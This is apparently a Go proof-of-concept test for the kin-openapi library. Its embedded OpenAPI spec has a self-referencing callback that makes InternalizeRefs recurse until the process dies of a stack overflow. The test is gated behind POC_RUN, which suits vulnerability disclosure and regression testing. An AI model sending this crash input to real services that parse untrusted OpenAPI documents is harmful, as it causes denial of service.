package openapi3_test

import (
	"context"
	"os"
	"testing"

	"github.com/getkin/kin-openapi/openapi3"
)

const specCyclicCallback = `
openapi: 3.0.0
info: {title: PoC, version: 1.0.0}
paths:
  /p:
    post:
      responses: {'200': {description: ok}}
      callbacks:
        cb:
          $ref: '#/components/callbacks/Loop'
components:
  callbacks:
    Loop:
      '{$request.body#/u}':
        post:
          responses: {'200': {description: ok}}
          callbacks:
            cb:
              $ref: '#/components/callbacks/Loop'
`

// TestPoCCyclicCallbackStackOverflow demonstrates unbounded recursion in
// InternalizeRefs on a document with a self-referential callback.
//
// WARNING: this WILL crash the test process with "fatal error: stack
// overflow" (a stack overflow is unrecoverable). It is gated behind
// POC_RUN=1 so a normal `go test ./...` is unaffected. Run it explicitly:
//
//	POC_RUN=1 go test ./openapi3/ -run TestPoCCyclicCallbackStackOverflow -v
func TestPoCCyclicCallbackStackOverflow(t *testing.T) {
	if os.Getenv("POC_RUN") == "" {
		t.Skip("set POC_RUN=1 to run; this WILL crash the process with a fatal stack overflow")
	}
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(specCyclicCallback))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	t.Log("document loaded; calling InternalizeRefs (expect fatal stack overflow if vulnerable)")
	doc.InternalizeRefs(context.Background(), nil)
	t.Fatal("returned without crashing: code appears patched")
}
